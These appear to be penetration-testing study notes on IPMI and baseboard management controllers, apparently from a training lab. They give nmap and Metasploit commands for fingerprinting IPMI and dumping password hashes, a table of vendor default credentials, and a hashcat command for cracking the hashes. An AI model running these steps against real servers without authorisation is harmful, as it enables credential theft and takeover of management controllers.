## Intelligent Platform Management Interface (IPMI)

Standardised system for management and monitoring 
Works independently of the hosts BIOS, CPU and firmware. 
Allows admins to monitor systems even if they are powered off. 

Typically used in 3 ways:
	- Before the OS has booted to modify BIOS settings
	- When the host is fully powered down
	- Access to a host after a system failure

Can monitor things such as:
	System Temp
	Voltage 
	Fan status 
	power supplies. 
	Review hardware logs and alerting using SNMP.
	
Host system can be powered off but off IPMI needs a power source and LAN connectivity.

Required Components: 
	- Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI
	- Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another
	- Intelligent Platform Management Bus (IPMB) - extends the BMC
	- IPMI Memory - stores things such as the system event log, repository store data, and more
	- Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus

Systems are known as Baseboard Management Controllers(BMCs)
Access to the BMC is nearly the same as physical access.
Many have a web based management console 

# Footprinting 
### Nmap
```shell-session
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

### Metasploit 
```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

### Default Passwords 

|Product|Username| Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|

### Try default passwords on any system

### Dangerous Settings
http://fish2.com/ipmi/remote-pw-cracking.html

Crack with hashcat 
```shell-session 
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

No direct fix to this exploit. 
Only to use very long difficult to crack passwords or network segmentation rules.
Passwords may be reused. 

### Dump Hashes with MSF 
```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```
